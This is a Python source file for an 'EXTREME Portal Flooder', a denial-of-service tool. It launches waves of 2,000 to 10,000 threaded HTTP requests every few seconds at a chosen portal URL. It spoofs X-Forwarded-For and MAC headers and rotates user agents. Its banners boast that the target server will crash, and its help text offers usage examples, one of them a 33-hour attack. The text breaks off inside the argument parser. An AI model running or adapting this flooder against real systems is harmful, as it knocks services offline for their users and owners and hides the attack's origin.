#!/usr/bin/env python3
"""
EXTREME Portal Flooder - Massive Scale Attack
2000 to 10,000 users per wave with intelligent resource management
"""

import requests
import threading
import time
import random
import sys
import os
from datetime import datetime
import argparse
import signal
import math

# ANSI color codes for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class ExtremePortalFlooder:
    def __init__(self, portal_url: str):
        """
        Initialize extreme portal flooder
        
        Args:
            portal_url: Full portal URL
        """
        self.portal_url = portal_url
        self.running = True
        self.attack_active = False
        
        # Extreme statistics
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'timeouts': 0,
            'connection_errors': 0,
            'waves_launched': 0,
            'active_threads': 0,
            'peak_threads': 0,
            'total_users_sent': 0
        }
        self.lock = threading.Lock()
        
        # EXTREME Configuration (Massive Scale)
        self.wave_interval = 3  # seconds between waves
        self.max_concurrent_threads = 1000  # Extreme threading
        self.min_users_per_wave = 2000  # MINIMUM 2000 users
        self.max_users_per_wave = 10000  # MAXIMUM 10,000 users
        self.total_duration = 300  # Default 5 minutes
        self.countdown_seconds = 15  # Extended countdown for extreme attack
        
        # Performance optimization
        self.batch_size = 200  # Users per batch
        self.request_timeout = 2  # Shorter timeout for speed
        self.retry_count = 1  # Single retry for failed requests
        
        # Wave management
        self.next_wave_time = 0
        self.wave_history = []
        
        # User agents pool (expanded)
        self.user_agents = self._generate_user_agents()
        
        # Results tracking
        self.start_time = None
        self.end_time = None
        
        # Performance monitoring
        self.performance_samples = []
        
        print(f"{Colors.RED}{Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════════════════╗")
        print("║                                                                      ║")
        print("║  ███████╗██╗  ██╗████████╗██████╗ ███████╗███╗   ███╗███████╗       ║")
        print("║  ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔════╝████╗ ████║██╔════╝       ║")
        print("║  █████╗   ╚███╔╝    ██║   ██████╔╝█████╗  ██╔████╔██║█████╗         ║")
        print("║  ██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══╝         ║")
        print("║  ███████╗██╔╝ ██╗   ██║   ██║  ██║███████╗██║ ╚═╝ ██║███████╗       ║")
        print("║  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝       ║")
        print("║                                                                      ║")
        print("║                 MASSIVE SCALE PORTAL FLOOD ATTACK                   ║")
        print("║                   2000 - 10,000 USERS PER WAVE                      ║")
        print("║                                                                      ║")
        print("╚══════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.END}")
        
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.YELLOW}🎯 Target URL: {self.portal_url}{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
    
    def _generate_user_agents(self):
        """Generate extensive user agents list"""
        agents = []
        
        # Chrome versions
        for version in [120, 121, 122, 123]:
            agents.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36")
            agents.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36")
            agents.append(f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36")
        
        # Firefox versions
        for version in [120, 121, 122]:
            agents.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{version}.0) Gecko/20100101 Firefox/{version}.0")
            agents.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:{version}.0) Gecko/20100101 Firefox/{version}.0")
        
        # Mobile agents
        agents.extend([
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
        ])
        
        return agents
    
    def show_extreme_configuration(self):
        """Display extreme configuration"""
        print(f"{Colors.RED}{Colors.BOLD}\n⚡ EXTREME CONFIGURATION - MASSIVE SCALE ATTACK{Colors.END}")
        print(f"{Colors.CYAN}{'─'*60}{Colors.END}")
        
        config_table = f"""
{Colors.WHITE}🎯 {Colors.BOLD}Target:{Colors.END} {self.portal_url}
{Colors.YELLOW}⏱️  {Colors.BOLD}Countdown:{Colors.END} {self.countdown_seconds} seconds
{Colors.GREEN}🌊 {Colors.BOLD}Wave Interval:{Colors.END} {self.wave_interval} seconds
{Colors.MAGENTA}👥 {Colors.BOLD}Users per Wave:{Colors.END} {self.min_users_per_wave:,} to {self.max_users_per_wave:,}
{Colors.BLUE}🧵 {Colors.BOLD}Max Threads:{Colors.END} {self.max_concurrent_threads:,}
{Colors.CYAN}⏳ {Colors.BOLD}Total Duration:{Colors.END} {self.total_duration} seconds ({self.total_duration//60} minutes)
{Colors.YELLOW}⚡ {Colors.BOLD}Request Timeout:{Colors.END} {self.request_timeout} seconds
{Colors.GREEN}📦 {Colors.BOLD}Batch Size:{Colors.END} {self.batch_size} users
        """
        
        print(config_table)
        print(f"{Colors.CYAN}{'─'*60}{Colors.END}")
        
        # Calculate estimated impact
        avg_users = (self.min_users_per_wave + self.max_users_per_wave) // 2
        estimated_waves = self.total_duration // self.wave_interval
        estimated_users = estimated_waves * avg_users
        
        print(f"{Colors.WHITE}{Colors.BOLD}\n📊 ESTIMATED MASSIVE IMPACT:{Colors.END}")
        print(f"{Colors.CYAN}{'─'*40}{Colors.END}")
        print(f"{Colors.WHITE}   Estimated Total Waves: {estimated_waves:,}")
        print(f"{Colors.WHITE}   Estimated Total Users: {estimated_users:,}")
        print(f"{Colors.WHITE}   Estimated Requests/Second: {avg_users/self.wave_interval:,.1f}")
        print(f"{Colors.WHITE}   Estimated Bandwidth: {(estimated_users * 5000) / (1024*1024*1024):.2f} GB")
        print(f"{Colors.CYAN}{'─'*40}{Colors.END}")
        
        # Show intensity level
        intensity = avg_users / self.wave_interval
        if intensity > 2000:
            level = "APOCALYPTIC"
            color = Colors.RED
        elif intensity > 1000:
            level = "EXTREME"
            color = Colors.RED
        elif intensity > 500:
            level = "VERY HIGH"
            color = Colors.YELLOW
        else:
            level = "HIGH"
            color = Colors.GREEN
        
        print(f"{color}{Colors.BOLD}   Attack Intensity Level: {level}{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
    
    def extreme_countdown(self, seconds: int):
        """Extreme countdown timer with massive attack warnings"""
        if seconds <= 0:
            print(f"{Colors.GREEN}{Colors.BOLD}\n⚡ MASSIVE ATTACK COMMENCING IMMEDIATELY!{Colors.END}")
            self.attack_active = True
            return
        
        print(f"{Colors.RED}{Colors.BOLD}\n☢️  FINAL COUNTDOWN TO MASSIVE ATTACK: {seconds} SECONDS{Colors.END}")
        print(f"{Colors.CYAN}{'─'*70}{Colors.END}")
        
        warning_messages = [
            "⚠️  PREPARE FOR 2000-10000 USER WAVES!",
            "⚠️  SERVER WILL BE OVERWHELMED!",
            "⚠️  NETWORK TRAFFIC WILL BE EXTREME!",
            "⚠️  THIS IS A DDoS-SCALE ATTACK!"
        ]
        
        for i in range(seconds, 0, -1):
            if not self.running:
                return
            
            # Show warning messages at specific intervals
            if i == seconds:
                print(f"{Colors.RED}{Colors.BOLD}{warning_messages[0]}{Colors.END}")
            elif i == seconds // 2:
                print(f"{Colors.YELLOW}{Colors.BOLD}{warning_messages[1]}{Colors.END}")
            elif i == seconds // 4:
                print(f"{Colors.YELLOW}{Colors.BOLD}{warning_messages[2]}{Colors.END}")
            elif i == 5:
                print(f"{Colors.RED}{Colors.BOLD}{warning_messages[3]}{Colors.END}")
            
            # Create massive scale progress bar
            bar_length = 50
            progress = (seconds - i) / seconds
            filled = int(bar_length * progress)
            
            # Color progression
            if progress < 0.3:
                bar_color = Colors.GREEN
                text_color = Colors.GREEN
            elif progress < 0.7:
                bar_color = Colors.YELLOW
                text_color = Colors.YELLOW
            else:
                bar_color = Colors.RED
                text_color = Colors.RED
            
            bar = bar_color + "█" * filled + Colors.WHITE + "░" * (bar_length - filled)
            
            # Format time
            if i > 60:
                minutes = i // 60
                secs = i % 60
                time_str = f"{minutes:02d}:{secs:02d}"
            else:
                time_str = f"{i:02d}s"
            
            print(f"\r{text_color}{Colors.BOLD}⏰ {time_str} {bar} {progress*100:.0f}%", end="", flush=True)
            
            # Intense effects for last seconds
            if i <= 10:
                print(f"{Colors.RED}{Colors.BOLD} ⚡", end="", flush=True)
            if i <= 3:
                print(f"{Colors.RED}{Colors.BOLD} 💥", end="", flush=True)
            
            time.sleep(1)
        
        # Final attack start animation
        print(f"\r{Colors.GREEN}{Colors.BOLD}" + " " * 80)
        print(f"\n{Colors.RED}{Colors.BOLD}" + "💥" * 35)
        print(f"{Colors.RED}{Colors.BOLD}   MASSIVE ATTACK IN PROGRESS!   ")
        print(f"{Colors.RED}{Colors.BOLD}" + "💥" * 35 + Colors.END)
        self.attack_active = True
    
    def generate_massive_headers(self, request_id: int):
        """Generate headers for massive scale requests"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Client-MAC': f"{random.randint(16,99):02x}:{random.randint(16,99):02x}:{random.randint(16,99):02x}:"
                          f"{random.randint(16,99):02x}:{random.randint(16,99):02x}:{random.randint(16,99):02x}",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Request-ID': str(request_id),
            'X-Attack-Wave': 'MASSIVE'
        }
    
    def massive_request(self, request_id: int, wave_id: int):
        """Make a request with retry logic for massive scale"""
        for attempt in range(self.retry_count + 1):
            try:
                headers = self.generate_massive_headers(request_id)
                
                # Micro-delay for request spreading
                if attempt == 0:
                    time.sleep(random.uniform(0.0001, 0.001))
                
                response = requests.get(
                    self.portal_url,
                    headers=headers,
                    timeout=self.request_timeout,
                    verify=False,
                    allow_redirects=True
                )
                
                with self.lock:
                    self.stats['total_requests'] += 1
                    
                    if 200 <= response.status_code < 400:
                        self.stats['successful'] += 1
                        return True
                    else:
                        self.stats['failed'] += 1
                        return False
                
            except requests.exceptions.Timeout:
                with self.lock:
                    if attempt == self.retry_count:
                        self.stats['total_requests'] += 1
                        self.stats['failed'] += 1
                        self.stats['timeouts'] += 1
                continue
                
            except requests.exceptions.ConnectionError:
                with self.lock:
                    if attempt == self.retry_count:
                        self.stats['total_requests'] += 1
                        self.stats['failed'] += 1
                        self.stats['connection_errors'] += 1
                continue
                
            except Exception:
                with self.lock:
                    if attempt == self.retry_count:
                        self.stats['total_requests'] += 1
                        self.stats['failed'] += 1
                continue
            finally:
                if attempt == self.retry_count:
                    with self.lock:
                        self.stats['active_threads'] -= 1
        
        return False
    
    def launch_massive_wave(self, wave_id: int):
        """Launch a massive wave of 2000-10000 users"""
        # Random user count for this wave
        num_users = random.randint(self.min_users_per_wave, self.max_users_per_wave)
        
        print(f"{Colors.MAGENTA}{Colors.BOLD}\n🌊 [MASSIVE WAVE {wave_id}] LAUNCHING {num_users:,} USERS!{Colors.END}")
        
        wave_start = time.time()
        
        with self.lock:
            self.stats['waves_launched'] += 1
            self.stats['total_users_sent'] += num_users
        
        # Calculate optimal batch count
        total_batches = math.ceil(num_users / self.batch_size)
        
        # Launch in optimized batches
        for batch_num in range(total_batches):
            if not self.running:
                break
            
            batch_start = batch_num * self.batch_size
            batch_end = min(batch_start + self.batch_size, num_users)
            batch_size = batch_end - batch_start
            
            print(f"{Colors.CYAN}   📦 Batch {batch_num + 1}/{total_batches}: {batch_size} users{Colors.END}", end="\r")
            
            batch_threads = []
            
            # Launch batch
            for i in range(batch_start, batch_end):
                if not self.running:
                    break
                
                # Thread management
                while self.running:
                    with self.lock:
                        if self.stats['active_threads'] < self.max_concurrent_threads:
                            self.stats['active_threads'] += 1
                            if self.stats['active_threads'] > self.stats['peak_threads']:
                                self.stats['peak_threads'] = self.stats['active_threads']
                            break
                    time.sleep(0.0001)  # Micro-sleep
                
                if not self.running:
                    break
                
                # Create thread
                request_id = wave_id * 10000000 + i
                thread = threading.Thread(
                    target=self.massive_request,
                    args=(request_id, wave_id)
                )
                thread.daemon = True
                thread.start()
                batch_threads.append(thread)
            
            # Wait for batch completion
            for thread in batch_threads:
                if self.running:
                    thread.join(timeout=1)
            
            # Small delay between batches
            if batch_num < total_batches - 1:
                time.sleep(0.01)
        
        wave_duration = time.time() - wave_start
        
        # Record wave performance
        wave_stats = {
            'wave_id': wave_id,
            'users': num_users,
            'duration': wave_duration,
            'batches': total_batches
        }
        self.wave_history.append(wave_stats)
        
        # Display wave completion
        if wave_duration < self.wave_interval:
            duration_color = Colors.GREEN
        elif wave_duration < self.wave_interval * 2:
            duration_color = Colors.YELLOW
        else:
            duration_color = Colors.RED
        
        print(f"{Colors.CYAN}   ✅ Wave {wave_id} ({num_users:,} users) completed in {duration_color}{wave_duration:.2f}s{Colors.CYAN}")
        
        return wave_stats
    
    def massive_wave_attack(self):
        """Continuous massive wave attack"""
        self.start_time = time.time()
        self.end_time = self.start_time + self.total_duration
        wave_id = 1
        
        print(f"{Colors.GREEN}{Colors.BOLD}\n🚀 MASSIVE WAVE ATTACK COMMENCED!{Colors.END}")
        print(f"{Colors.YELLOW}⏳ Duration: {self.total_duration:,}s | 🌊 Interval: {self.wave_interval}s | 👥 Scale: {self.min_users_per_wave:,}-{self.max_users_per_wave:,} users{Colors.END}")
        print(f"{Colors.CYAN}{'─'*80}{Colors.END}")
        
        # Set first wave
        self.next_wave_time = self.start_time
        
        while self.running and time.time() < self.end_time:
            current_time = time.time()
            
            # Launch wave if time
            if current_time >= self.next_wave_time:
                self.launch_massive_wave(wave_id)
                
                # Schedule next wave
                self.next_wave_time = current_time + self.wave_interval
                wave_id += 1
            
            # Performance monitoring
            if len(self.performance_samples) < 1000:
                with self.lock:
                    sample = {
                        'time': current_time - self.start_time,
                        'requests': self.stats['total_requests'],
                        'threads': self.stats['active_threads']
                    }
                    self.performance_samples.append(sample)
            
            time.sleep(0.001)  # Minimal sleep
        
        # Complete duration
        remaining = self.end_time - time.time()
        if remaining > 0:
            print(f"{Colors.YELLOW}\n⏳ Completing attack duration... {remaining:.1f}s remaining{Colors.END}")
            time.sleep(remaining)
    
    def display_massive_stats(self):
        """Display real-time massive statistics"""
        last_update = 0
        update_interval = 0.3  # Faster updates for massive scale
        
        while self.running and (not self.end_time or time.time() < self.end_time):
            current_time = time.time()
            
            if current_time - last_update >= update_interval:
                with self.lock:
                    total = self.stats['total_requests']
                    success = self.stats['successful']
                    failed = self.stats['failed']
                    waves = self.stats['waves_launched']
                    active = self.stats['active_threads']
                    peak = self.stats['peak_threads']
                    total_users = self.stats['total_users_sent']
                
                if self.start_time:
                    elapsed = current_time - self.start_time
                    if elapsed > 0:
                        req_per_sec = total / elapsed
                        
                        if self.total_duration:
                            remaining = max(0, self.total_duration - elapsed)
                            progress = min(100, (elapsed / self.total_duration) * 100)
                        else:
                            remaining = 0
                            progress = 100
                        
                        # Calculate rates
                        success_rate = (success / total * 100) if total > 0 else 0
                        
                        # Format display
                        url_short = self.portal_url[:30] + "..." if len(self.portal_url) > 33 else self.portal_url.ljust(33)
                        
                        # Build massive status line
                        status = (f"{Colors.WHITE}🎯 {url_short:33s} | "
                                 f"{Colors.CYAN}🌊 {waves:4d} | "
                                 f"{Colors.GREEN}✅ {success:8,} | "
                                 f"{Colors.RED}❌ {failed:7,} | "
                                 f"{Colors.YELLOW}📈 {success_rate:5.1f}% | "
                                 f"{Colors.MAGENTA}⚡ {req_per_sec:7.1f}/s | "
                                 f"{Colors.BLUE}👥 {total_users:8,} | "
                                 f"{Colors.WHITE}🧵 {active:4d}/{peak:4d} | ")
                        
                        if self.total_duration:
                            # Color based on remaining time
                            if remaining > self.total_duration * 0.3:
                                time_color = Colors.GREEN
                            elif remaining > self.total_duration * 0.1:
                                time_color = Colors.YELLOW
                            else:
                                time_color = Colors.RED
                            
                            status += f"{time_color}⏳ {remaining:5.0f}s ({progress:3.0f}%){Colors.END}"
                        
                        sys.stdout.write("\r" + status + " " * 10)
                        sys.stdout.flush()
                
                last_update = current_time
            
            time.sleep(0.05)  # Very short sleep for responsive updates
    
    def run_extreme_attack(self):
        """Run the extreme massive attack"""
        # Show configuration
        self.show_extreme_configuration()
        
        # Extreme warnings
        print(f"{Colors.RED}{Colors.BOLD}\n" + "☢️ " * 40)
        print(f"{Colors.RED}{Colors.BOLD}   EXTREME WARNING: MASSIVE DDoS-SCALE ATTACK")
        print(f"{Colors.RED}{Colors.BOLD}   THIS WILL GENERATE 2000-10000 REQUESTS EVERY 3 SECONDS")
        print(f"{Colors.RED}{Colors.BOLD}   TARGET SERVER WILL LIKELY CRASH OR BECOME UNRESPONSIVE")
        print(f"{Colors.RED}{Colors.BOLD}   NETWORK CONGESTION IS GUARANTEED")
        print(f"{Colors.RED}{Colors.BOLD}   USE WITH EXTREME CAUTION AND PROPER AUTHORIZATION!")
        print(f"{Colors.RED}{Colors.BOLD}" + "☢️ " * 40 + Colors.END)
        
        # Double confirmation
        confirm1 = input(f"{Colors.YELLOW}{Colors.BOLD}\n❓ CONFIRM EXTREME ATTACK? (type 'MASSIVE' to proceed): ").upper()
        
        if confirm1 != "MASSIVE":
            print(f"{Colors.RED}\n❌ Attack cancelled - safety first!")
            return
        
        confirm2 = input(f"{Colors.RED}{Colors.BOLD}\n⚠️  FINAL WARNING: This will overwhelm the target! Type 'CONFIRM' to continue: ").upper()
        
        if confirm2 != "CONFIRM":
            print(f"{Colors.RED}\n❌ Attack cancelled - wise decision!")
            return
        
        # Start countdown
        self.extreme_countdown(self.countdown_seconds)
        
        if not self.running:
            return
        
        # Start stats display
        stats_thread = threading.Thread(target=self.display_massive_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Run attack
        try:
            self.massive_wave_attack()
        except KeyboardInterrupt:
            print(f"{Colors.YELLOW}\n\n⚠️  Extreme attack stopped by user")
        except Exception as e:
            print(f"{Colors.RED}\n❌ Error during attack: {e}")
        
        # Cleanup
        self.end_time = time.time()
        self.running = False
        time.sleep(2)  # Allow threads to finish
        
        # Show final report
        self.show_extreme_report()
    
    def show_extreme_report(self):
        """Show extreme scale final report"""
        if not self.start_time:
            return
        
        total_duration = self.end_time - self.start_time
        
        print(f"{Colors.RED}{Colors.BOLD}\n" + "💥" * 40)
        print(f"{Colors.RED}{Colors.BOLD}          EXTREME ATTACK COMPLETE - FINAL REPORT")
        print(f"{Colors.RED}{Colors.BOLD}" + "💥" * 40 + Colors.END)
        
        with self.lock:
            total = self.stats['total_requests']
            success = self.stats['successful']
            failed = self.stats['failed']
            timeouts = self.stats['timeouts']
            conn_errors = self.stats['connection_errors']
            waves = self.stats['waves_launched']
            peak_threads = self.stats['peak_threads']
            total_users = self.stats['total_users_sent']
        
        # Calculate statistics
        success_rate = (success / total * 100) if total > 0 else 0
        req_per_sec = total / total_duration if total_duration > 0 else 0
        req_per_minute = req_per_sec * 60
        req_per_hour = req_per_minute * 60
        
        print(f"{Colors.WHITE}\n🎯 TARGET: {self.portal_url}")
        print(f"{Colors.CYAN}⏱️  ACTUAL DURATION: {total_duration:.1f} seconds ({total_duration/3600:.2f} hours)")
        print(f"{Colors.GREEN}🌊 WAVES COMPLETED: {waves}")
        
        # Massive scale metrics
        print(f"{Colors.WHITE}\n📊 MASSIVE SCALE METRICS:")
        print(f"{Colors.CYAN}{'─'*40}{Colors.END}")
        print(f"{Colors.GREEN}   ✅ Successful Requests: {success:,}")
        print(f"{Colors.RED}   ❌ Failed Requests: {failed:,}")
        print(f"{Colors.YELLOW}   📊 Total Requests: {total:,}")
        print(f"{Colors.CYAN}   📈 Success Rate: {success_rate:.2f}%")
        print(f"{Colors.MAGENTA}   ⚡ Requests/Second: {req_per_sec:,.1f}")
        print(f"{Colors.MAGENTA}   ⚡ Requests/Minute: {req_per_minute:,.0f}")
        print(f"{Colors.MAGENTA}   ⚡ Requests/Hour: {req_per_hour:,.0f}")
        print(f"{Colors.BLUE}   👥 Total Users Sent: {total_users:,}")
        print(f"{Colors.BLUE}   🧵 Peak Threads: {peak_threads:,}")
        
        # Failure analysis
        if failed > 0:
            print(f"{Colors.WHITE}\n⚠️  FAILURE ANALYSIS:")
            print(f"{Colors.CYAN}{'─'*30}{Colors.END}")
            timeout_pct = (timeouts / failed * 100) if failed > 0 else 0
            conn_pct = (conn_errors / failed * 100) if failed > 0 else 0
            other_pct = 100 - timeout_pct - conn_pct
            
            print(f"{Colors.RED}   Timeouts: {timeouts:,} ({timeout_pct:.1f}%)")
            print(f"{Colors.RED}   Connection Errors: {conn_errors:,} ({conn_pct:.1f}%)")
            print(f"{Colors.RED}   Other Failures: {failed - timeouts - conn_errors:,} ({other_pct:.1f}%)")
        
        # Extreme impact assessment
        print(f"{Colors.WHITE}\n💥 EXTREME IMPACT ASSESSMENT:")
        print(f"{Colors.CYAN}{'─'*40}{Colors.END}")
        
        # Bandwidth estimation
        bandwidth_mb = (total * 5000) / (1024*1024)
        bandwidth_gb = bandwidth_mb / 1024
        
        print(f"{Colors.YELLOW}   Estimated Bandwidth: {bandwidth_mb:,.1f} MB ({bandwidth_gb:.2f} GB)")
        print(f"{Colors.YELLOW}   Estimated Concurrent Users: ~{req_per_sec * 3:.0f}")
        
        # Intensity classification
        if req_per_sec > 2000:
            intensity = "APOCALYPTIC"
            color = Colors.RED
        elif req_per_sec > 1000:
            intensity = "EXTREME DDoS"
            color = Colors.RED
        elif req_per_sec > 500:
            intensity = "MAJOR DDoS"
            color = Colors.YELLOW
        elif req_per_sec > 200:
            intensity = "HEAVY LOAD"
            color = Colors.YELLOW
        else:
            intensity = "MODERATE"
            color = Colors.GREEN
        
        print(f"{color}   Attack Intensity: {intensity}{Colors.END}")
        
        # Wave analysis
        if self.wave_history:
            print(f"{Colors.WHITE}\n🌊 WAVE PERFORMANCE ANALYSIS:")
            print(f"{Colors.CYAN}{'─'*40}{Colors.END}")
            
            avg_users = sum(w['users'] for w in self.wave_history) / len(self.wave_history)
            avg_duration = sum(w['duration'] for w in self.wave_history) / len(self.wave_history)
            
            print(f"{Colors.WHITE}   Average Wave Size: {avg_users:,.0f} users")
            print(f"{Colors.WHITE}   Average Wave Duration: {avg_duration:.2f} seconds")
            print(f"{Colors.WHITE}   Wave Efficiency: {(avg_users/avg_duration):.1f} users/second")
        
        # Save detailed report
        self.save_extreme_report(total_duration)
        
        print(f"{Colors.CYAN}\n{'='*80}{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}✅ EXTREME ATTACK COMPLETE - CHECK LOG FILE FOR DETAILS{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
    
    def save_extreme_report(self, duration: float):
        """Save extreme attack report"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"extreme_attack_{timestamp}.log"
        
        with self.lock:
            total = self.stats['total_requests']
            success = self.stats['successful']
            failed = self.stats['failed']
            timeouts = self.stats['timeouts']
            conn_errors = self.stats['connection_errors']
            waves = self.stats['waves_launched']
            peak_threads = self.stats['peak_threads']
            total_users = self.stats['total_users_sent']
        
        with open(filename, 'w') as f:
            f.write("="*100 + "\n")
            f.write("EXTREME MASSIVE SCALE PORTAL FLOOD ATTACK REPORT\n")
            f.write("="*100 + "\n\n")
            
            f.write(f"Attack Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target URL: {self.portal_url}\n")
            f.write(f"Actual Duration: {duration:.2f} seconds\n\n")
            
            f.write("EXTREME CONFIGURATION:\n")
            f.write("-"*50 + "\n")
            f.write(f"Countdown Timer: {self.countdown_seconds} seconds\n")
            f.write(f"Requested Duration: {self.total_duration} seconds\n")
            f.write(f"Wave Interval: {self.wave_interval} seconds\n")
            f.write(f"Users per Wave: {self.min_users_per_wave} to {self.max_users_per_wave}\n")
            f.write(f"Max Concurrent Threads: {self.max_concurrent_threads}\n")
            f.write(f"Batch Size: {self.batch_size}\n")
            f.write(f"Request Timeout: {self.request_timeout}s\n")
            f.write(f"Retry Count: {self.retry_count}\n\n")
            
            f.write("MASSIVE SCALE RESULTS:\n")
            f.write("-"*50 + "\n")
            f.write(f"Waves Launched: {waves}\n")
            f.write(f"Total Users Sent: {total_users:,}\n")
            f.write(f"Total Requests: {total:,}\n")
            f.write(f"Successful Requests: {success:,}\n")
            f.write(f"Failed Requests: {failed:,}\n")
            f.write(f"Success Rate: {(success/total*100) if total > 0 else 0:.2f}%\n")
            f.write(f"Requests/Second: {total/duration:.2f}\n")
            f.write(f"Requests/Minute: {total/duration*60:.0f}\n")
            f.write(f"Requests/Hour: {total/duration*3600:.0f}\n")
            f.write(f"Peak Concurrent Threads: {peak_threads}\n\n")
            
            f.write("FAILURE ANALYSIS:\n")
            f.write("-"*50 + "\n")
            f.write(f"Timeouts: {timeouts} ({(timeouts/failed*100) if failed > 0 else 0:.1f}%)\n")
            f.write(f"Connection Errors: {conn_errors} ({(conn_errors/failed*100) if failed > 0 else 0:.1f}%)\n")
            f.write(f"Other Failures: {failed - timeouts - conn_errors} ({(failed - timeouts - conn_errors)/failed*100 if failed > 0 else 0:.1f}%)\n\n")
            
            f.write("IMPACT ESTIMATION:\n")
            f.write("-"*50 + "\n")
            bandwidth_mb = (total * 5000) / (1024*1024)
            f.write(f"Estimated Bandwidth Used: {bandwidth_mb:,.1f} MB\n")
            f.write(f"Estimated Concurrent Users: ~{total/duration*3:.0f}\n")
            f.write(f"Attack Intensity Level: {'APOCALYPTIC' if total/duration > 2000 else 'EXTREME' if total/duration > 1000 else 'MAJOR' if total/duration > 500 else 'HEAVY' if total/duration > 200 else 'MODERATE'}\n\n")
            
            f.write("WAVE HISTORY:\n")
            f.write("-"*50 + "\n")
            for wave in self.wave_history[-20:]:  # Last 20 waves
                f.write(f"Wave {wave['wave_id']}: {wave['users']:,} users, {wave['duration']:.2f}s, {wave['batches']} batches\n")
            
            f.write("\nCOMMAND TO REPEAT:\n")
            f.write("-"*50 + "\n")
            f.write(f"python3 extreme_flood.py --url \"{self.portal_url}\" ")
            f.write(f"--duration {self.total_duration} --threads {self.max_concurrent_threads} ")
            f.write(f"--min {self.min_users_per_wave} --max {self.max_users_per_wave} ")
            f.write(f"--countdown {self.countdown_seconds}\n")
        
        print(f"{Colors.GREEN}\n📄 Extreme attack report saved to: {filename}{Colors.END}")


def signal_handler(sig, frame):
    """Handle Ctrl+C for extreme attack"""
    print(f"{Colors.YELLOW}\n\n⚠️  Stopping extreme attack...")
    sys.exit(0)


def main():
    """Main function for extreme flooder"""
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(
        description="EXTREME Portal Flooder - 2000 to 10000 users per wave",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES OF MASSIVE ATTACKS:
  
  # Your command with extreme scale (120000 seconds = 33.3 hours!)
  python3 extreme_flood.py --url "http://10.0.0.1/client?page=dashboard" --duration 120000 --threads 1000
  
  # 5-minute extreme test
  python3 extreme_flood.py --url "http://10.0.0.1" --duration 300 --threads 500
  
  # Custom massive wave sizes
  python3 extreme_flood.py --url "http://10.0.0.1" --min 5000 --max 15000 --duration 600
  
  # Quick extreme test (1 minute)
  python3 extreme_flood.py --url "http://10.0.0.1/client?page=dashboard"

DEFAULT MASSIVE SETTINGS:
  • Countdown: 15 seconds
  • Duration: 300 seconds (5 minutes)
  • Min Users: 2000 (MASSIVE)
  • Max Users: 10000 (EXTREME)
  • Threads: 1000 (EXTREME CONCURRENCY)
  • Wave Interval: 3 seconds
  • Batch Size: 200 users

WARNING: This is a DDoS-scale attack tool that can:
  • Overwhelm and crash servers
  • Cause network congestion
  • Generate massive traffic (GBs per hour)
  • Trigger security alerts
  • Potentially violate laws

USE WITH EXTREME CAUTION AND PROPER AUTHORIZATION!
        """
    )
    
    parser.add_argument("--url", "-u", required=True, help="Portal URL to attack")
    
    # Timing
    parser.add_argument("--countdown", "-c", type=int, default=15, 
                       help="Countdown timer in seconds (default: 15)")
    parser.add_argument("--duration", "-d", type=int, default=300,
                       help="Attack duration in seconds (default: 300 = 5 minutes)")
    parser.add_argument("--interval", "-i", type=int, default=3,
                       help="Seconds between waves (default: 3)")
    
    # Extreme user configuration
    parser.add_argument("--min", type=int, default=2000,
                       help=f"MINIMUM users per wave (default: 2000, MINIMUM: 2000)")
    parser.add_argument("--max", type=int, default=10000,
                       help=f"MAXIMUM users per wave (default: 10000, MAXIMUM: 20000)")
    parser.add_argument("--threads", "-t", type=int, default=1000,
                       help="Max concurrent threads (default: 1000)")
    
    # Performance tuning
    parser.add_argument("--batch", "-b", type=int, default=200,
                       help="Users per batch (default: 200)")
